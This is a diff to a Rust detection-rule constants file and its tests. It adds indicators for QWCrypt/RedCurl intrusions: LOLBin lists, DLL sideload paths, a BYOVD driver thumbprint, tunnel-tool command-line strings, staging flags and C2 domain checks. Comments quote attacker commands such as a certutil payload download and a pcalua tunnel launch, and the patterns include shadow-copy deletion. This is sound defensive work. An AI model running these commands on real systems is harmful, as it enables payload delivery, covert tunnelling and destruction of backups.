@@ -272,10 +272,20 @@ pub const EID_W32TIME_SYNC: u32 = 158;
 
 // ── Additional Sysmon EID constants ─────────────────────────────────────────
 
+/// Sysmon EID 6: Driver Load — kernel driver loaded; used to detect BYOVD driver
+/// loads via signer / certificate checks.
+pub const EID_SYSMON_DRIVER_LOAD: u32 = 6;
 /// Sysmon EID 10: ProcessAccess — one process opened a handle to another.
 pub const EID_SYSMON_PROCESS_ACCESS: u32 = 10;
+/// Sysmon EID 12: RegistryEvent (Object create/delete).
+pub const EID_SYSMON_REGISTRY_ADD: u32 = 12;
+/// Sysmon EID 13: RegistryEvent (Value Set).
+pub const EID_SYSMON_REGISTRY_MODIFY: u32 = 13;
 /// Sysmon EID 16: Sysmon configuration changed.
 pub const EID_SYSMON_CONFIG_CHANGE: u32 = 16;
+/// Sysmon EID 26: FileDeleteDetected — file deletion observed (Sysmon v13+);
+/// complements EID 23 when archive-mode is not enabled.
+pub const EID_SYSMON_FILE_DELETE_DETECTED: u32 = 26;
 /// Sysmon EID 255: Sysmon error / driver unload.
 pub const EID_SYSMON_DRIVER_UNLOAD: u32 = 255;
 
@@ -455,6 +465,11 @@ pub const WEBDAV_LOL_PROCESSES: &[&str] = &[
     "mshta.exe",
     "odbcconf.exe",
     "ieexec.exe",
+    // certutil abused for WebDAV download: certutil -urlcache -split -f \\server@443\DavWWWRoot\payload
+    "certutil.exe",
+    // pcalua.exe (Program Compatibility Assistant LOLBin) used to launch payloads
+    // via "pcalua -a conhost.exe -c --headless python.exe cl.py" in RedCurl intrusions
+    "pcalua.exe",
 ];
 
 /// Substrings in a process CommandLine that indicate WebDAV-style UNC paths.
@@ -541,6 +556,135 @@ pub const QWCRYPT_PS_PATTERNS: &[&str] = &[
     "vssadmin delete shadows",
     "wbadmin delete",
     "bcdedit /set.*recoveryenabled",
+];
+
+// ── SCM service state change EID ─────────────────────────────────────────────
+
+/// System EID 7036: Service control manager — a service has changed state.
+/// `param1` = service name, `param2` = new state ("Running" / "Stopped").
+/// WebClient service starting unexpectedly is a high-fidelity precursor to any
+/// rundll32/certutil WebDAV payload download (T1102, T1105).
+pub const EID_SCM_SERVICE_STATE_CHANGE: u32 = 7036;
+
+/// Service name for the WebDAV Mini-Redirector (WebClient).
+/// Starting on a host that previously had it stopped enables UNC WebDAV paths
+/// of the form `\\server@443\DavWWWRoot\payload` — the delivery mechanism used
+/// by LNK-to-rundll32 chains in QWCrypt/RedCurl and many other campaigns.
+pub const WEBCLIENT_SERVICE_NAME: &str = "WebClient";
+
+// ── DLL sideloading / hijacking IOCs ─────────────────────────────────────────
+
+/// DLL basenames confirmed as sideloading targets in QWCrypt/RedCurl intrusions.
+/// Both are legitimate Windows DLLs with 29+ legitimate loaders (per HijackLibs);
+/// the signal is: loaded from a path that is NOT a Windows system directory.
+pub const SIDELOAD_HIJACK_DLLS: &[&str] = &[
+    "srvcli.dll",
+    "netutils.dll",
+];
+
+/// Path prefixes for directories that are safe (legitimate) locations for
+/// `srvcli.dll` and `netutils.dll`. A load from ANY other path is suspicious.
+pub const SYSTEM_DLL_SAFE_PATH_PREFIXES: &[&str] = &[
+    "C:\\Windows\\System32\\",
+    "C:\\Windows\\SysWOW64\\",
+    "C:\\Windows\\WinSxS\\",
+];
+
+// ── AD Explorer forensic tombstone ───────────────────────────────────────────
+
+/// Registry key path fragment written on first run of Sysinternals AD Explorer.
+/// The full key is `HKCU\Software\Sysinternals\Active Directory Explorer`.
+/// It persists even after the tool is deleted — a durable recon tombstone (T1087).
+pub const ADEXPLORER_EULAACCEPTED_KEY_FRAGMENT: &str =
+    "Sysinternals\\Active Directory Explorer";
+
+// ── Zemana BYOVD signer thumbprint ───────────────────────────────────────────
+
+/// Certificate thumbprint of Zemana Ltd — the signing cert on the Terminator
+/// BYOVD driver (ZAM64.sys) abused by QWCrypt/RedCurl (T1068).
+/// A driver load (Sysmon EID 6) with this thumbprint from outside the Zemana
+/// install path (`C:\Program Files\Zemana\*`) is near-zero-FP on enterprise hosts.
+pub const ZEMANA_SIGNER_THUMBPRINT: &str = "96A7749D856CB49DE32005BCDD8621F38E2B4C05";
+
+// ── Reverse proxy / tunnel tool indicators ───────────────────────────────────
+
+/// Command-line substrings present when Chisel (Go SOCKS5/HTTP tunnel) is run.
+/// Match case-insensitively in any of: EID 1 CommandLine, EID 4688 CommandLine.
+pub const CHISEL_CMDLINE_INDICATORS: &[&str] = &[
+    "--reverse",
+    "R:socks",
+    "socks5",
+    "--tls-skip-verify",
+    ":127.0.0.1:",
+];
+
+/// Command-line substrings present when RPivot (SOCKS4 tunnel) is run.
+/// The `cl.py` / `client.py` launcher + `--s`/`--p` flags are tool-specific.
+/// QWCrypt/RedCurl uses `pcalua.exe -a conhost.exe -c --headless python.exe cl.py`.
+pub const RPIVOT_CMDLINE_INDICATORS: &[&str] = &[
+    "cl.py",
+    "client.py",
+    "--headless",
+];
+
+// ── 7-Zip staging indicators ──────────────────────────────────────────────────
+
+/// Suspicious parent images for archiver processes.
+/// 7-Zip launched from these parents indicates script/malware-driven staging.
+pub const STAGING_PARENT_IMAGES: &[&str] = &[
+    "pcalua.exe",
+    "WmiPrvSE.exe",
+    "wmic.exe",
+    "cscript.exe",
+    "wscript.exe",
+    "mshta.exe",
+];
+
+/// 7-Zip flag that encrypts archive headers (filenames hidden inside the archive).
+/// Rarely used by legitimate administrators; common in ransomware staging.
+pub const ARCHIVER_HEADER_ENCRYPT_FLAG: &str = "-mhe";
+
+// ── Fake browser-update scheduled task indicators ────────────────────────────
+
+/// Task name substrings that mimic legitimate browser updater scheduled tasks.
+/// RedCurl uses these names but sets the action path to a user-writable directory
+/// instead of the real browser installation path.
+pub const BROWSER_UPDATE_TASK_PATTERNS: &[&str] = &[
+    "GoogleUpdateTask",
+    "MicrosoftEdgeUpdate",
+    "MozillaMaintenance",
+    "ChromeUpdate",
+    "BraveSoftwareUpdate",
+    "OperaScheduled",
+];
+
+// ── Cloudflare Workers C2 detection ──────────────────────────────────────────
+
+/// DNS suffix used by Cloudflare Workers — abused as a rotating C2 redirector
+/// by QWCrypt/RedCurl (T1102). Queried by non-browser processes is near-zero-FP.
+pub const CLOUDFLARE_WORKERS_DOMAIN_SUFFIX: &str = ".workers.dev";
+
+/// Process basenames for browsers that legitimately query `.workers.dev` domains.
+/// All other processes querying this suffix are suspicious.
+pub const BROWSER_PROCESS_NAMES: &[&str] = &[
+    "chrome.exe",
+    "msedge.exe",
+    "firefox.exe",
+    "iexplore.exe",
+    "brave.exe",
+    "opera.exe",
+    "safari.exe",
+    "vivaldi.exe",
+];
+
+// ── WMI / Impacket lateral movement indicators ────────────────────────────────
+
+/// Command-line substrings that indicate the Impacket wmiexec.py output-redirect
+/// technique: `wmiexec.py` redirects stdout to a temp file under `\\127.0.0.1\ADMIN$\__<ts>`.
+/// Near-zero false-positive — legitimate admin WMI does not use this pattern.
+pub const WMI_IMPACKET_INDICATORS: &[&str] = &[
+    "\\\\127.0.0.1\\ADMIN$\\__",
+    "127.0.0.1\\ADMIN$\\__",
 ];
 
 // ── Tests ─────────────────────────────────────────────────────────────────────
@@ -787,5 +931,170 @@ mod tests {
     #[test]
     fn eid_process_create_is_4688() {
         assert_eq!(EID_PROCESS_CREATE, 4688);
+    }
+
+    // ── New Sysmon EIDs ──────────────────────────────────────────────────────
+
+    #[test]
+    fn sysmon_driver_load_is_eid_6() {
+        assert_eq!(EID_SYSMON_DRIVER_LOAD, 6);
+    }
+
+    #[test]
+    fn sysmon_registry_add_is_eid_12() {
+        assert_eq!(EID_SYSMON_REGISTRY_ADD, 12);
+    }
+
+    #[test]
+    fn sysmon_registry_modify_is_eid_13() {
+        assert_eq!(EID_SYSMON_REGISTRY_MODIFY, 13);
+    }
+
+    #[test]
+    fn sysmon_file_delete_detected_is_eid_26() {
+        assert_eq!(EID_SYSMON_FILE_DELETE_DETECTED, 26);
+    }
+
+    #[test]
+    fn scm_service_state_change_is_eid_7036() {
+        assert_eq!(EID_SCM_SERVICE_STATE_CHANGE, 7036);
+    }
+
+    // ── WebClient service ────────────────────────────────────────────────────
+
+    #[test]
+    fn webclient_service_name_is_correct() {
+        assert_eq!(WEBCLIENT_SERVICE_NAME, "WebClient");
+    }
+
+    // ── WebDAV LOLBins — certutil and pcalua added ────────────────────────────
+
+    #[test]
+    fn webdav_lol_processes_includes_certutil() {
+        assert!(
+            WEBDAV_LOL_PROCESSES.contains(&"certutil.exe"),
+            "certutil.exe must be in WEBDAV_LOL_PROCESSES"
+        );
+    }
+
+    #[test]
+    fn webdav_lol_processes_includes_pcalua() {
+        assert!(
+            WEBDAV_LOL_PROCESSES.contains(&"pcalua.exe"),
+            "pcalua.exe must be in WEBDAV_LOL_PROCESSES"
+        );
+    }
+
+    // ── DLL sideload constants ───────────────────────────────────────────────
+
+    #[test]
+    fn sideload_hijack_dlls_includes_srvcli() {
+        assert!(SIDELOAD_HIJACK_DLLS.contains(&"srvcli.dll"));
+    }
+
+    #[test]
+    fn sideload_hijack_dlls_includes_netutils() {
+        assert!(SIDELOAD_HIJACK_DLLS.contains(&"netutils.dll"));
+    }
+
+    #[test]
+    fn system_dll_safe_paths_includes_system32() {
+        assert!(SYSTEM_DLL_SAFE_PATH_PREFIXES.iter().any(|p| p.contains("System32")));
+    }
+
+    // ── AD Explorer tombstone ────────────────────────────────────────────────
+
+    #[test]
+    fn adexplorer_key_fragment_is_correct() {
+        assert_eq!(
+            ADEXPLORER_EULAACCEPTED_KEY_FRAGMENT,
+            "Sysinternals\\Active Directory Explorer"
+        );
+    }
+
+    // ── Zemana thumbprint ────────────────────────────────────────────────────
+
+    #[test]
+    fn zemana_thumbprint_is_40_hex_chars() {
+        assert_eq!(ZEMANA_SIGNER_THUMBPRINT.len(), 40);
+        assert!(
+            ZEMANA_SIGNER_THUMBPRINT.chars().all(|c| c.is_ascii_hexdigit()),
+            "Zemana thumbprint must be hex digits only"
+        );
+    }
+
+    // ── Tunnel tool indicators ───────────────────────────────────────────────
+
+    #[test]
+    fn chisel_indicators_includes_socks5() {
+        assert!(CHISEL_CMDLINE_INDICATORS.contains(&"socks5"));
+    }
+
+    #[test]
+    fn rpivot_indicators_includes_cl_py() {
+        assert!(RPIVOT_CMDLINE_INDICATORS.contains(&"cl.py"));
+    }
+
+    #[test]
+    fn rpivot_indicators_includes_headless() {
+        assert!(RPIVOT_CMDLINE_INDICATORS.contains(&"--headless"));
+    }
+
+    // ── 7-Zip staging ────────────────────────────────────────────────────────
+
+    #[test]
+    fn archiver_header_encrypt_flag_is_mhe() {
+        assert_eq!(ARCHIVER_HEADER_ENCRYPT_FLAG, "-mhe");
+    }
+
+    #[test]
+    fn staging_parent_images_includes_pcalua() {
+        assert!(STAGING_PARENT_IMAGES.contains(&"pcalua.exe"));
+    }
+
+    #[test]
+    fn staging_parent_images_includes_wmiprvse() {
+        assert!(STAGING_PARENT_IMAGES.contains(&"WmiPrvSE.exe"));
+    }
+
+    // ── Browser-update task patterns ─────────────────────────────────────────
+
+    #[test]
+    fn browser_update_patterns_includes_google() {
+        assert!(BROWSER_UPDATE_TASK_PATTERNS.iter().any(|p| p.contains("GoogleUpdateTask")));
+    }
+
+    #[test]
+    fn browser_update_patterns_includes_edge() {
+        assert!(BROWSER_UPDATE_TASK_PATTERNS.iter().any(|p| p.contains("MicrosoftEdgeUpdate")));
+    }
+
+    // ── Cloudflare Workers C2 ────────────────────────────────────────────────
+
+    #[test]
+    fn workers_dev_suffix_is_correct() {
+        assert_eq!(CLOUDFLARE_WORKERS_DOMAIN_SUFFIX, ".workers.dev");
+    }
+
+    #[test]
+    fn browser_process_names_includes_chrome() {
+        assert!(BROWSER_PROCESS_NAMES.contains(&"chrome.exe"));
+    }
+
+    #[test]
+    fn browser_process_names_includes_edge() {
+        assert!(BROWSER_PROCESS_NAMES.contains(&"msedge.exe"));
+    }
+
+    // ── WMI Impacket indicators ──────────────────────────────────────────────
+
+    #[test]
+    fn wmi_impacket_indicators_not_empty() {
+        assert!(!WMI_IMPACKET_INDICATORS.is_empty());
+    }
+
+    #[test]
+    fn wmi_impacket_indicators_includes_admin_share_pattern() {
+        assert!(WMI_IMPACKET_INDICATORS.iter().any(|s| s.contains("ADMIN$")));
     }
 }
